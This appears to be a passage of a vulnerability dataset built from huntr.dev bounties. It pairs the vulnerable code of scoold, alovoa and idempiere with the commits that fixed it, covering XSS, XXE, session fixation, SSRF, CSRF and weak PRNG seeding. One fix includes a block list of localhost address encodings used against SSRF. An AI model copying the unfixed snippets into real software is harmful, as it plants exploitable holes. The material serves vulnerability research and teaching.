  #set($_welcomeMessageOnLoginJS = ""WELCOME_MESSAGE_ONLOGIN = '$_welcomeMsgOnLogin'"")
  <script nonce=""$cspNonce"">$ctxPathJS;$isRTLJS;$isAdminJS;$maxTagsJS;$_welcomeMessageJS;$_welcomeMessageOnLoginJS;</script>
  <script nonce=""$cspNonce"">$ctxPathJS;$isRTLJS;$isAdminJS;$maxTagsJS;$minPassLen;$_welcomeMessageJS;$_welcomeMessageOnLoginJS;</script>
  <script nonce=""$cspNonce"" src=""$!scriptslink/scoold.js""></script>

  #if ($request.getServletPath() == $signinlink)
8
src/main/resources/templates/signin.vm
@@ -43,7 +43,9 @@
       #if(!$resend)
       <div class=""input-field mvm"">
        <label for=""passw"">$!lang.get('password')</label>
        <input id=""passw"" type=""password"" name=""passw"" value="""" minlength=""6"" required>
        <input id=""passw"" type=""password"" name=""passw"" value="""" minlength=""$MIN_PASS_LENGTH"" required>
        <div><small id=""pass-meter-message"" class=""grey-text""></small></div>
        #getmessagebox(""red white-text"" $error.get(""passw""))
       </div>
       #end

@@ -97,7 +99,9 @@
      #if($token)
       <div class=""input-field mvm"">
        <label for=""newpassword"">$!lang.get('newpassword')</label>
        <input id=""newpassword"" type=""password"" name=""newpassword"" value="""" minlength=""6"" required>
        <input id=""newpassword"" type=""password"" name=""newpassword"" value="""" minlength=""$MIN_PASS_LENGTH"" required>
        <div><small id=""pass-meter-message"" class=""grey-text""></small></div>
        #getmessagebox(""red white-text"" $error.get(""newpassword""))
       </div>
      #end
      #if($token)"
https://huntr.dev/bounties/1624645101345-Alovoa/alovoa/,Incorrect Usage of Seeds in Pseudo-Random Number Generator (PRNG) in alovoa/alovoa,"Random.setSeed should not be called with a constant integer argument. If a Random object is seeded with a specific value, the values returned by Random.nextInt() and similar methods which return or assign values are predictable.",,CWE-335: Incorrect Usage of Seeds in Pseudo-Random Number Generator (PRNG),https://www.github.com/alovoa/alovoa/commit/744f8ed9c70ed21579c277ba9b0c3532500838d7,"@@ -479,7 +479,6 @@ public void noiseStrokes() {
 }

 public void noiseStrokes(int strokes, float width) {
  RAND.setSeed(49);
  _img_g.setStroke(new BasicStroke(width));
  _img_g.setColor(_fg_color);
  for (int i = 0; i < strokes; i++) {
@@ -820,7 +819,6 @@ public void distortionElastic(double alpha) {
 }

 public void distortionElastic(double alpha, int kernelSize, double sigma) {
  RAND.setSeed(3);
  int s[][] = getImageArray2D();
  double source[][] = new double[_height][_width];
  double dxField[][] = new double[_height][_width];

","2
src/main/java/com/nonononoki/alovoa/lib/OxCaptcha.java
@@ -479,7 +479,6 @@ public void noiseStrokes() {
 }

 public void noiseStrokes(int strokes, float width) {
  RAND.setSeed(49);
  _img_g.setStroke(new BasicStroke(width));
  _img_g.setColor(_fg_color);
  for (int i = 0; i < strokes; i++) {
@@ -820,7 +819,6 @@ public void distortionElastic(double alpha) {
 }

 public void distortionElastic(double alpha, int kernelSize, double sigma) {
  RAND.setSeed(3);
  int s[][] = getImageArray2D();
  double source[][] = new double[_height][_width];
  double dxField[][] = new double[_height][_width];"
https://huntr.dev/bounties/23faf7ed-983f-429d-89e3-bb2e8b6a884e/,XML Injection (aka Blind XPath Injection) in alovoa/alovoa,Affected versions of this package are vulnerable to XML External Entity (XXE) Injection via the SAML2AssertionValidator method. Access to external entities was not disabled in XML parsing.,,CWE-91: XML Injection (aka Blind XPath Injection),https://www.github.com/alovoa/alovoa/commit/f3b39355243a565a8409cc27a15f503eae4c6660,"@@ -6,7 +6,7 @@
 <parent>
  <groupId>org.springframework.boot</groupId>
  <artifactId>spring-boot-starter-parent</artifactId>
  <version>2.3.9.RELEASE</version>
  <relativePath />
 </parent>
 <groupId>com.alovoa</groupId>

@@ -1,52 +1,46 @@
package com.nonononoki.alovoa.config;

import java.nio.charset.StandardCharsets;
import java.util.Locale;

import org.springframework.context.MessageSource;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.support.ReloadableResourceBundleMessageSource;
import org.springframework.web.servlet.LocaleResolver;
import org.springframework.web.servlet.config.annotation.EnableWebMvc;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.ResourceHandlerRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;
import org.springframework.web.servlet.i18n.CookieLocaleResolver;
import org.springframework.web.servlet.i18n.LocaleChangeInterceptor;
 
@Configuration
@EnableWebMvc
@ComponentScan
public class WebMvcConfig implements WebMvcConfigurer {






 @Override
    public void addResourceHandlers(ResourceHandlerRegistry registry) {
        registry
          .addResourceHandler(""/**"")
          .addResourceLocations(""classpath:/static/""); 
    }

 @Bean(name = ""localeResolver"")
 public LocaleResolver getLocaleResolver()  {
  CookieLocaleResolver clr = new CookieLocaleResolver();
  clr.setDefaultLocale(Locale.ENGLISH);
     return clr;
 } 

    @Bean(name = ""messageSource"")
    public MessageSource getMessageResource()  {
        ReloadableResourceBundleMessageSource messageResource= new ReloadableResourceBundleMessageSource();
        messageResource.setBasename(""classpath:i18n/messages"");
        messageResource.setDefaultEncoding(StandardCharsets.UTF_8.name());
        return messageResource;
    }
    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        LocaleChangeInterceptor localeInterceptor = new LocaleChangeInterceptor();
        localeInterceptor.setParamName(""lang"");
        registry.addInterceptor(localeInterceptor).addPathPatterns(""/*"");
    }

}
@@ -547,9 +547,8 @@ public void addImage(String imgB64) throws AlovoaException, IOException {

 public void deleteImage(long id) throws AlovoaException {
  User user = authService.getCurrentUser();
  UserImage img = userImageRepo.getOne(id);

  if (user.getImages().contains(img)) {
   user.getImages().remove(img);
   userRepo.saveAndFlush(user);
  }
@@ -667,9 +666,9 @@ public void likeUser(String idEnc) throws AlovoaException, GeneralSecurityExcept
   notificationService.newLike(user);

   user.getDates().setNotificationDate(new Date());
   
   currUser.getHiddenUsers().removeIf(hide -> hide.getUserTo().getId().equals(user.getId()));
   
   userRepo.saveAndFlush(user);
   userRepo.saveAndFlush(currUser);


@@ -9,9 +9,11 @@ server.port=${PORT:8443}
#server.ssl.key-store-password=alovoa
#server.ssl.key-alias=alovoa



server.http2.enabled=true

spring.datasource.platform=mysql
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver
spring.datasource.url=jdbc:mysql://localhost:3306/alovoa?createDatabaseIfNotExist=true&serverTimezone=UTC&useLegacyDatetimeCode=false

@@ -23,7 +25,7 @@ spring.datasource.url=jdbc:mysql://localhost:3306/alovoa?createDatabaseIfNotExis

#we keep the default /login/oauth2/code/{registrationId} scheme

spring.mvc.locale=en_EN

spring.security.oauth2.client.registration.google.scope[0]=email
spring.security.oauth2.client.registration.google.scope[1]=profile

","2
pom.xml
@@ -6,7 +6,7 @@
 <parent>
  <groupId>org.springframework.boot</groupId>
  <artifactId>spring-boot-starter-parent</artifactId>
  <version>2.3.9.RELEASE</version>
  <version>2.5.3</version>
  <relativePath />
 </parent>
 <groupId>com.alovoa</groupId>
58
src/main/java/com/nonononoki/alovoa/config/WebMvcConfig.java
@@ -1,52 +1,46 @@
package com.nonononoki.alovoa.config;

import java.nio.charset.StandardCharsets;
import java.util.Locale;

import org.springframework.context.MessageSource;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.support.ReloadableResourceBundleMessageSource;
import org.springframework.web.servlet.LocaleResolver;
import org.springframework.web.servlet.config.annotation.EnableWebMvc;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.ResourceHandlerRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;
import org.springframework.web.servlet.i18n.CookieLocaleResolver;
import org.springframework.web.servlet.i18n.LocaleChangeInterceptor;
 
@Configuration
@EnableWebMvc
@ComponentScan
public class WebMvcConfig implements WebMvcConfigurer {


 @Override
 public void addResourceHandlers(ResourceHandlerRegistry registry) {
  registry.addResourceHandler(""/**"").addResourceLocations(""classpath:/static/"");
 }

 @Override
    public void addResourceHandlers(ResourceHandlerRegistry registry) {
        registry
          .addResourceHandler(""/**"")
          .addResourceLocations(""classpath:/static/""); 
    }

 @Bean(name = ""localeResolver"")
 public LocaleResolver getLocaleResolver()  {
  CookieLocaleResolver clr = new CookieLocaleResolver();
  clr.setDefaultLocale(Locale.ENGLISH);
     return clr;
 } 

    @Bean(name = ""messageSource"")
    public MessageSource getMessageResource()  {
        ReloadableResourceBundleMessageSource messageResource= new ReloadableResourceBundleMessageSource();
        messageResource.setBasename(""classpath:i18n/messages"");
        messageResource.setDefaultEncoding(StandardCharsets.UTF_8.name());
        return messageResource;
    }
    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        LocaleChangeInterceptor localeInterceptor = new LocaleChangeInterceptor();
        localeInterceptor.setParamName(""lang"");
        registry.addInterceptor(localeInterceptor).addPathPatterns(""/*"");
    }

 public void addInterceptors(InterceptorRegistry registry) {
  LocaleChangeInterceptor localeInterceptor = new LocaleChangeInterceptor();
  localeInterceptor.setParamName(""lang"");
  registry.addInterceptor(localeInterceptor).addPathPatterns(""/*"");
 }

 @Bean
 public CookieLocaleResolver localeResolver() {
  return new CookieLocaleResolver();
 }

 @Bean
 public ReloadableResourceBundleMessageSource messageSource() {
  ReloadableResourceBundleMessageSource messageResource = new ReloadableResourceBundleMessageSource();
  messageResource.setBasename(""classpath:i18n/messages"");
  messageResource.setDefaultEncoding(StandardCharsets.UTF_8.name());
  return messageResource;
 }

}
9
src/main/java/com/nonononoki/alovoa/service/UserService.java
@@ -547,9 +547,8 @@ public void addImage(String imgB64) throws AlovoaException, IOException {

 public void deleteImage(long id) throws AlovoaException {
  User user = authService.getCurrentUser();
  UserImage img = userImageRepo.getOne(id);

  if (user.getImages().contains(img)) {
  UserImage img = userImageRepo.findById(id).orElse(null);
  if (img != null && user.getImages().contains(img)) {
   user.getImages().remove(img);
   userRepo.saveAndFlush(user);
  }
@@ -667,9 +666,9 @@ public void likeUser(String idEnc) throws AlovoaException, GeneralSecurityExcept
   notificationService.newLike(user);

   user.getDates().setNotificationDate(new Date());
   
   currUser.getHiddenUsers().removeIf(hide -> hide.getUserTo().getId().equals(user.getId()));
   
   userRepo.saveAndFlush(user);
   userRepo.saveAndFlush(currUser);

6
src/main/resources/application.properties
@@ -9,9 +9,11 @@ server.port=${PORT:8443}
#server.ssl.key-store-password=alovoa
#server.ssl.key-alias=alovoa

spring.main.allow-bean-definition-overriding=true

server.http2.enabled=true

spring.datasource.platform=mysql
spring.sql.init.platform=mysql
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver
spring.datasource.url=jdbc:mysql://localhost:3306/alovoa?createDatabaseIfNotExist=true&serverTimezone=UTC&useLegacyDatetimeCode=false

@@ -23,7 +25,7 @@ spring.datasource.url=jdbc:mysql://localhost:3306/alovoa?createDatabaseIfNotExis

#we keep the default /login/oauth2/code/{registrationId} scheme

spring.mvc.locale=en_EN
spring.web.locale=en_EN

spring.security.oauth2.client.registration.google.scope[0]=email
spring.security.oauth2.client.registration.google.scope[1]=profile"
https://huntr.dev/bounties/15789ff4-190a-4502-bb0f-332dc5a98c49/,Cross-site Scripting (XSS) - Reflected in alovoa/alovoa,xss bug,,CWE-79: Cross-site Scripting (XSS) - Reflected,https://www.github.com/alovoa/alovoa/commit/3c93dea7aae02c09af12882984d66972851e4890,"@@ -10,6 +10,7 @@
import org.springframework.web.bind.annotation.ExceptionHandler;
import org.springframework.web.context.request.WebRequest;
import org.springframework.web.servlet.mvc.method.annotation.ResponseEntityExceptionHandler;


@ControllerAdvice
public class RestExceptionHandler extends ResponseEntityExceptionHandler {
@@ -19,7 +20,7 @@ public class RestExceptionHandler extends ResponseEntityExceptionHandler {
 @ExceptionHandler
 protected ResponseEntity<Object> handleConflict(Exception ex, WebRequest request) {
  LOGGER.error(ExceptionUtils.getStackTrace(ex));
  return handleExceptionInternal(ex, ex.getMessage() /* ExceptionUtils.getStackTrace(ex) */, new HttpHeaders(),
    HttpStatus.CONFLICT, request);
 }
}
","3
src/main/java/com/nonononoki/alovoa/component/RestExceptionHandler.java
@@ -10,6 +10,7 @@
import org.springframework.web.bind.annotation.ExceptionHandler;
import org.springframework.web.context.request.WebRequest;
import org.springframework.web.servlet.mvc.method.annotation.ResponseEntityExceptionHandler;
import org.springframework.web.util.HtmlUtils;

@ControllerAdvice
public class RestExceptionHandler extends ResponseEntityExceptionHandler {
@@ -19,7 +20,7 @@ public class RestExceptionHandler extends ResponseEntityExceptionHandler {
 @ExceptionHandler
 protected ResponseEntity<Object> handleConflict(Exception ex, WebRequest request) {
  LOGGER.error(ExceptionUtils.getStackTrace(ex));
  return handleExceptionInternal(ex, ex.getMessage() /* ExceptionUtils.getStackTrace(ex) */, new HttpHeaders(),
  return handleExceptionInternal(ex, HtmlUtils.htmlEscape(ex.getMessage()), new HttpHeaders(),
    HttpStatus.CONFLICT, request);
 }
}"
https://huntr.dev/bounties/5794bd79-ffab-4b45-b110-dd659557cefa/,Cross-site Scripting (XSS) - DOM in alovoa/alovoa,"It is possible to run JavaScript code in the webpage by DOM unsanitized properties. The function onChangeLocal sets the value of window.location.search directly from the URL, without previous checks.",,CWE-79: Cross-site Scripting (XSS) - DOM,https://www.github.com/alovoa/alovoa/commit/01ae69d6bb14725309e7b51a7b93c42134aa796a,"@@ -136,7 +136,9 @@
   function onChangeLocal(e) {
    let val = e.options[e.selectedIndex].value;
    console.log(val);
    window.location.search = val;


   }
  </script>
 </footer>

","4
src/main/resources/templates/fragments.html
@@ -136,7 +136,9 @@
   function onChangeLocal(e) {
    let val = e.options[e.selectedIndex].value;
    console.log(val);
    window.location.search = val;
    if (val.includes('?lang=') && val.length == 8) {
     window.location.search = val;
    }
   }
  </script>
 </footer>"
https://huntr.dev/bounties/39653d5b-e8ae-4865-9faf-2077e0e4b15a/,Session Fixation in alovoa/alovoa,"When a logged in user changes his password, the session does not expire after the update.",,CWE-384: Session Fixation,https://www.github.com/alovoa/alovoa/commit/d4be216564d4508550955ab6013506697059d5e8,"@@ -4,6 +4,7 @@
import java.security.NoSuchAlgorithmException;

import javax.mail.MessagingException;


import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.PostMapping;
@@ -30,7 +31,7 @@ public void resetPasword(@RequestBody PasswordResetDto dto)
 }

 @PostMapping(value = ""/change"", consumes = ""application/json"")
 public void changePasword(@RequestBody PasswordChangeDto dto) throws AlovoaException {
  passwordService.changePasword(dto);
 }
}
@@ -5,6 +5,7 @@
import java.util.Date;

import javax.mail.MessagingException;


import org.apache.commons.lang3.RandomStringUtils;
import org.springframework.beans.factory.annotation.Autowired;
@@ -59,7 +60,7 @@ public UserPasswordToken resetPasword(PasswordResetDto dto)
   if (u == null) {
    throw new DisabledException(""user_not_found"");
   }
   
   if (u.isDisabled()) {
    throw new DisabledException(""user_disabled"");
   }
@@ -77,7 +78,7 @@ public UserPasswordToken resetPasword(PasswordResetDto dto)
  return u.getPasswordToken();
 }

 public void changePasword(PasswordChangeDto dto) throws AlovoaException {
  UserPasswordToken token = userPasswordTokenRepo.findByContent(dto.getToken());
  if (token == null) {
   throw new AlovoaException(""token_not_found"");
@@ -98,5 +99,6 @@ public void changePasword(PasswordChangeDto dto) throws AlovoaException {
  }

  userRepo.saveAndFlush(user);

 }
}
@@ -1,9 +1,12 @@
package com.nonononoki.alovoa.service;

import static org.mockito.ArgumentMatchers.any;


import java.util.List;



import org.junit.Assert;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
@@ -111,7 +114,9 @@ void test() throws Exception {
  passwordChangeDto.setEmail(user1.getEmail());
  passwordChangeDto.setPassword(newPassword);
  passwordChangeDto.setToken(userPasswordToken.getContent());
  passwordService.changePasword(passwordChangeDto);



  user1 = userRepo.findById(user1.getId()).get();


","5
src/main/java/com/nonononoki/alovoa/rest/PasswordController.java
@@ -4,6 +4,7 @@
import java.security.NoSuchAlgorithmException;

import javax.mail.MessagingException;
import javax.servlet.http.HttpSession;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.PostMapping;
@@ -30,7 +31,7 @@ public void resetPasword(@RequestBody PasswordResetDto dto)
 }

 @PostMapping(value = ""/change"", consumes = ""application/json"")
 public void changePasword(@RequestBody PasswordChangeDto dto) throws AlovoaException {
  passwordService.changePasword(dto);
 public void changePasword(@RequestBody PasswordChangeDto dto, HttpSession session) throws AlovoaException {
  passwordService.changePasword(dto, session);
 }
}
6
src/main/java/com/nonononoki/alovoa/service/PasswordService.java
@@ -5,6 +5,7 @@
import java.util.Date;

import javax.mail.MessagingException;
import javax.servlet.http.HttpSession;

import org.apache.commons.lang3.RandomStringUtils;
import org.springframework.beans.factory.annotation.Autowired;
@@ -59,7 +60,7 @@ public UserPasswordToken resetPasword(PasswordResetDto dto)
   if (u == null) {
    throw new DisabledException(""user_not_found"");
   }
   
   if (u.isDisabled()) {
    throw new DisabledException(""user_disabled"");
   }
@@ -77,7 +78,7 @@ public UserPasswordToken resetPasword(PasswordResetDto dto)
  return u.getPasswordToken();
 }

 public void changePasword(PasswordChangeDto dto) throws AlovoaException {
 public void changePasword(PasswordChangeDto dto, HttpSession session) throws AlovoaException {
  UserPasswordToken token = userPasswordTokenRepo.findByContent(dto.getToken());
  if (token == null) {
   throw new AlovoaException(""token_not_found"");
@@ -98,5 +99,6 @@ public void changePasword(PasswordChangeDto dto) throws AlovoaException {
  }

  userRepo.saveAndFlush(user);
  session.invalidate();
 }
}
7
src/test/java/com/nonononoki/alovoa/service/PasswordServiceTest.java
@@ -1,9 +1,12 @@
package com.nonononoki.alovoa.service;

import static org.mockito.ArgumentMatchers.any;
import static org.mockito.Mockito.mock;

import java.util.List;

import javax.servlet.http.HttpSession;

import org.junit.Assert;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
@@ -111,7 +114,9 @@ void test() throws Exception {
  passwordChangeDto.setEmail(user1.getEmail());
  passwordChangeDto.setPassword(newPassword);
  passwordChangeDto.setToken(userPasswordToken.getContent());
  passwordService.changePasword(passwordChangeDto);

  HttpSession session = mock(HttpSession.class);
  passwordService.changePasword(passwordChangeDto, session);

  user1 = userRepo.findById(user1.getId()).get();"
https://huntr.dev/bounties/1625588898157-Erudika/scoold/,Session Fixation in erudika/scoold,Session Fixation vulnerability found in scoold in which it doesn't expire the sessions after password update.,,CWE-384: Session Fixation,https://www.github.com/erudika/scoold/commit/69b0f1dbe101abced0a0e4c13a228ddd45929960,"@@ -95,6 +95,7 @@ public String post(@RequestParam(required = false) String tags, @RequestParam(re
   }

   if (resetPasswordAndUpdate(authUser.getUser(), oldpassword, newpassword)) {

    return ""redirect:"" + SETTINGSLINK + ""?passChanged=true"";
   }
  }

","1
src/main/java/com/erudika/scoold/controllers/SettingsController.java
@@ -95,6 +95,7 @@ public String post(@RequestParam(required = false) String tags, @RequestParam(re
   }

   if (resetPasswordAndUpdate(authUser.getUser(), oldpassword, newpassword)) {
    utils.clearSession(req, res);
    return ""redirect:"" + SETTINGSLINK + ""?passChanged=true"";
   }
  }"
https://huntr.dev/bounties/1625589113033-Erudika/scoold/,Server-Side Request Forgery (SSRF) in erudika/scoold,Possible SSRF in scoold in user profile picture from URL,,CWE-918: Server-Side Request Forgery (SSRF),https://www.github.com/erudika/scoold/commit/cfd6405a241126227252467f06d36157f1aec2de,"@@ -200,7 +200,9 @@ public static String getCookieValue(HttpServletRequest req, String name) {
  * @return the content of the image or null
  */
 public static void getAvatar(String url, HttpServletResponse res) {
  if (StringUtils.isBlank(url)) {


   getDefaultAvatarImage(res);
   return;
  }

","4
src/main/java/com/erudika/scoold/utils/HttpUtils.java
@@ -200,7 +200,9 @@ public static String getCookieValue(HttpServletRequest req, String name) {
  * @return the content of the image or null
  */
 public static void getAvatar(String url, HttpServletResponse res) {
  if (StringUtils.isBlank(url)) {
  if (StringUtils.isBlank(url) || !StringUtils.startsWithIgnoreCase(url, ""https://"") ||
    StringUtils.containsAnyIgnoreCase(url, ""localhost"", ""127.0.0.1"", ""0177.0.0.1"", ""0x7f.0.0.1"", ""0x7f000001"",
      ""2130706433"", ""017700000001"", ""127.0.1"", ""127.1"")) {
   getDefaultAvatarImage(res);
   return;
  }"
https://huntr.dev/bounties/1-Erudika/scoold/,Cross-Site Request Forgery (CSRF) in erudika/scoold,The /voteup/question/* endpoint does not have a CSRF protection. This could be exploited by an attacker to manipulate votes in a question.,,CWE-352: Cross-Site Request Forgery (CSRF),https://www.github.com/erudika/scoold/commit/5f2438780ab6797283b2f2981e23298091f9be0d,"@@ -52,8 +52,8 @@
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;

import org.springframework.web.bind.annotation.ResponseBody;

/**
@@ -83,15 +83,15 @@ public VoteController(ScooldUtils utils) {
 }

 @ResponseBody
 @GetMapping(""/voteup/{type}/{id}"")
 public Boolean voteup(@PathVariable String type, @PathVariable String id, HttpServletRequest req) {
  //addModel(""voteresult"", result);
  ParaObject votable = StringUtils.isBlank(type) ? pc.read(id) : pc.read(type, id);
  return processVoteRequest(true, votable, req);
 }

 @ResponseBody
 @GetMapping(""/votedown/{type}/{id}"")
 public Boolean votedown(@PathVariable String type, @PathVariable String id, HttpServletRequest req) {
  //addModel(""voteresult"", result);
  ParaObject votable = StringUtils.isBlank(type) ? pc.read(id) : pc.read(type, id);

@@ -323,7 +323,7 @@ $(function () {
  var newvotes = parseInt(votes.text(), 10) || 0;
  if (!dis.data(""disabled"")) {
   dis.data(""disabled"", true);
   $.get(this.href, function(data) {
    if (data === true) {
     if (up) {
      newvotes++;

","6
src/main/java/com/erudika/scoold/controllers/VoteController.java
@@ -52,8 +52,8 @@
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.ResponseBody;

/**
@@ -83,15 +83,15 @@ public VoteController(ScooldUtils utils) {
 }

 @ResponseBody
 @GetMapping(""/voteup/{type}/{id}"")
 @PostMapping(""/voteup/{type}/{id}"")
 public Boolean voteup(@PathVariable String type, @PathVariable String id, HttpServletRequest req) {
  //addModel(""voteresult"", result);
  ParaObject votable = StringUtils.isBlank(type) ? pc.read(id) : pc.read(type, id);
  return processVoteRequest(true, votable, req);
 }

 @ResponseBody
 @GetMapping(""/votedown/{type}/{id}"")
 @PostMapping(""/votedown/{type}/{id}"")
 public Boolean votedown(@PathVariable String type, @PathVariable String id, HttpServletRequest req) {
  //addModel(""voteresult"", result);
  ParaObject votable = StringUtils.isBlank(type) ? pc.read(id) : pc.read(type, id);
2
src/main/resources/static/scripts/scoold.js
@@ -323,7 +323,7 @@ $(function () {
  var newvotes = parseInt(votes.text(), 10) || 0;
  if (!dis.data(""disabled"")) {
   dis.data(""disabled"", true);
   $.get(this.href, function(data) {
   $.post(this.href, function(data) {
    if (data === true) {
     if (up) {
      newvotes++;"
https://huntr.dev/bounties/1-idempiere/idempiere/,Cross-site Scripting (XSS) - Stored in idempiere/idempiere,Stored xss via svg file upload,,CWE-79: Cross-site Scripting (XSS) - Stored,https://www.github.com/idempiere/idempiere/commit/fa0b52abd6ac976eb6ffe45dd2b43ae858812f43,"@@ -0,0 +1,11 @@











@@ -0,0 +1,8 @@








@@ -17,8 +17,11 @@
package org.adempiere.webui.window;

import java.io.InputStream;


import java.util.logging.Level;


import org.adempiere.webui.AdempiereWebUI;
import org.adempiere.webui.ClientInfo;
import org.adempiere.webui.LayoutUtils;
@@ -34,6 +37,7 @@
import org.compiere.model.MImage;
import org.compiere.util.CLogger;
import org.compiere.util.Env;

import org.compiere.util.Msg;
import org.compiere.util.Util;
import org.zkoss.image.AImage;
@@ -47,7 +51,7 @@
import org.zkoss.zul.Center;
import org.zkoss.zul.Div;
import org.zkoss.zul.Hbox;
import org.zkoss.zul.Image;
import org.zkoss.zul.North;
import org.zkoss.zul.Separator;
import org.zkoss.zul.South;
@@ -97,6 +101,9 @@ public WImageDialog (MImage mImage)
     AImage aImage = new AImage(m_mImage.getName(), m_mImage.getData());

     image.setContent(aImage);



    } catch (Exception e) {
     log.log(Level.WARNING, ""load image"", e);
    }
@@ -117,15 +124,27 @@ public WImageDialog (MImage mImage)
 private Panel parameterPanel = new Panel();
 private Button fileButton = new Button();
 private Button captureButton = new Button();
 private Image image = new Image();
 private ConfirmPanel confirmPanel = new ConfirmPanel(true,false,true,false,false,false);
 private boolean cancel = false;
 private Textbox fileNameTextbox = new Textbox();

 private Div captureDiv;
 private String defaultNameForCaptureImage = ""CapturedImage"";
 private Button cancelCaptureButton;













 /**
  *  Static Init
  *  @throws Exception
@@ -243,6 +262,9 @@ else if (e.getTarget().getId().equals(ConfirmPanel.A_RESET))
  {
   AImage img = null;
   image.setContent(img);



   fileNameTextbox.setValue(null);
  }
  else if (e.getTarget() == captureButton)
@@ -270,6 +292,9 @@ else if (e.getName().equals(""onCaptureImage""))
    byte[] imageData = Base64.decodeBase64(dataUrl.substring(contentStartIndex).getBytes());
    AImage img = new AImage(defaultNameForCaptureImage, imageData);
    image.setContent(img);




    if (m_mImage == null)
     m_mImage = new MImage (Env.getCtx(), 0, null);
@@ -328,14 +353,25 @@ private void processUploadMedia(Media imageFile) {
   return;

  String fileName = imageFile.getName();




  //  See if we can load & display it
  try
  {
   InputStream is = imageFile.getStreamData();
   AImage aImage = new AImage(fileName, is);

   image.setContent(aImage);









   is.close();
  }

","11
migration/i8.2/oracle/202106081633_IDEMPIERE-3980.sql
@@ -0,0 +1,11 @@
SET SQLBLANKLINES ON
SET DEFINE OFF

-- IDEMPIERE-3980
-- Jun 8, 2021, 4:32:50 PM CEST
INSERT INTO AD_Message (MsgType,MsgText,AD_Client_ID,AD_Org_ID,IsActive,Created,CreatedBy,Updated,UpdatedBy,AD_Message_ID,Value,EntityType,AD_Message_UU) VALUES ('E','File not allowed for uploading, just image types jpg/png/gif/tiff/bmp/ico',0,0,'Y',TO_DATE('2021-06-08 16:32:49','YYYY-MM-DD HH24:MI:SS'),100,TO_DATE('2021-06-08 16:32:49','YYYY-MM-DD HH24:MI:SS'),100,200711,'UploadImageTypeNotAllowed','D','7f3ed66b-6875-49e2-b45f-42ed9c7548e1')
;

SELECT register_migration_script('202106081633_IDEMPIERE-3980.sql') FROM dual
;

8
migration/i8.2/postgresql/202106081633_IDEMPIERE-3980.sql
@@ -0,0 +1,8 @@
-- IDEMPIERE-3980
-- Jun 8, 2021, 4:32:50 PM CEST
INSERT INTO AD_Message (MsgType,MsgText,AD_Client_ID,AD_Org_ID,IsActive,Created,CreatedBy,Updated,UpdatedBy,AD_Message_ID,Value,EntityType,AD_Message_UU) VALUES ('E','File not allowed for uploading, just image types jpg/png/gif/tiff/bmp/ico',0,0,'Y',TO_TIMESTAMP('2021-06-08 16:32:49','YYYY-MM-DD HH24:MI:SS'),100,TO_TIMESTAMP('2021-06-08 16:32:49','YYYY-MM-DD HH24:MI:SS'),100,200711,'UploadImageTypeNotAllowed','D','7f3ed66b-6875-49e2-b45f-42ed9c7548e1')
;

SELECT register_migration_script('202106081633_IDEMPIERE-3980.sql') FROM dual
;

48
org.adempiere.ui.zk/WEB-INF/src/org/adempiere/webui/window/WImageDialog.java
@@ -17,8 +17,11 @@
package org.adempiere.webui.window;

import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;

import org.adempiere.exceptions.AdempiereException;
import org.adempiere.webui.AdempiereWebUI;
import org.adempiere.webui.ClientInfo;
import org.adempiere.webui.LayoutUtils;
@@ -34,6 +37,7 @@
import org.compiere.model.MImage;
import org.compiere.util.CLogger;
import org.compiere.util.Env;
import org.compiere.util.MimeType;
import org.compiere.util.Msg;
import org.compiere.util.Util;
import org.zkoss.image.AImage;
@@ -47,7 +51,7 @@
import org.zkoss.zul.Center;
import org.zkoss.zul.Div;
import org.zkoss.zul.Hbox;
import org.zkoss.zul.Image;
import org.zkoss.zul.Iframe;
import org.zkoss.zul.North;
import org.zkoss.zul.Separator;
import org.zkoss.zul.South;
@@ -97,6 +101,9 @@ public WImageDialog (MImage mImage)
     AImage aImage = new AImage(m_mImage.getName(), m_mImage.getData());

     image.setContent(aImage);
     image.setClientAttribute(""sandbox"", """");
     image.setVisible(true);
     image.invalidate();
    } catch (Exception e) {
     log.log(Level.WARNING, ""load image"", e);
    }
@@ -117,15 +124,27 @@ public WImageDialog (MImage mImage)
 private Panel parameterPanel = new Panel();
 private Button fileButton = new Button();
 private Button captureButton = new Button();
 private Image image = new Image();
 private Iframe image = new Iframe();
 private ConfirmPanel confirmPanel = new ConfirmPanel(true,false,true,false,false,false);
 private boolean cancel = false;
 private Textbox fileNameTextbox = new Textbox();

 private Div captureDiv;
 private String defaultNameForCaptureImage = ""CapturedImage"";
 private Button cancelCaptureButton;


 private static List<String> autoPreviewList;

 static {
  autoPreviewList = new ArrayList<String>();
  autoPreviewList.add(""image/jpeg"");
  autoPreviewList.add(""image/png"");
  autoPreviewList.add(""image/gif"");
  autoPreviewList.add(""image/tiff"");
  autoPreviewList.add(""image/bmp"");
  autoPreviewList.add(""image/x-icon"");
 }

 /**
  *  Static Init
  *  @throws Exception
@@ -243,6 +262,9 @@ else if (e.getTarget().getId().equals(ConfirmPanel.A_RESET))
  {
   AImage img = null;
   image.setContent(img);
   image.setClientAttribute(""sandbox"", """");
   image.setVisible(true);
   image.invalidate();
   fileNameTextbox.setValue(null);
  }
  else if (e.getTarget() == captureButton)
